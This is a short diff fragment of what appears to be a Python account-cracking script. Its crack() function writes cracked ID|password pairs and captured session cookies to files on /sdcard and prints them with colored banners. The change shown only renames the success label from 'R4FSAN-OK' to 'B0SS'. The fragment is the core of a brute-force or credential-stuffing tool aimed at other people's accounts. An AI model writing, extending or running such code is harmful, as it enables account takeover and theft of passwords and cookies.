 						#	Audio_('cp.mp3')
 							open('/sdcard/'+sim_cp,'a').write(idf+'|'+pw+'\n')
 							break
@@ -653,7 +607,7 @@ def crack(idf,pwx,url,time_xx):
 					ok+=1
 					open('/sdcard/'+sim_ok,'a').write(data+'\n');Audio_('data/.bossok.mp3')
 					if "coookie_xxx" in accountok:
-						print(f"\n \033[42m\033[1;91m R4FSAN-OK \033[00m\033[00m:%s %s|%s \n {wa} %sâ€¢%s "%(II, idf , pw ,join_id_date,join_to_id(idf)))
+						print(f"\n \033[42m\033[1;91m B0SS \033[00m\033[00m:%s %s|%s \n {wa} %sâ€¢%s "%(II, idf , pw ,join_id_date,join_to_id(idf)))
 						print(f"\r \033[47m\033[1;31m COOKIE \033[00m\033[00m: %s%s"%(I, coookie_xxx ))
 						
 
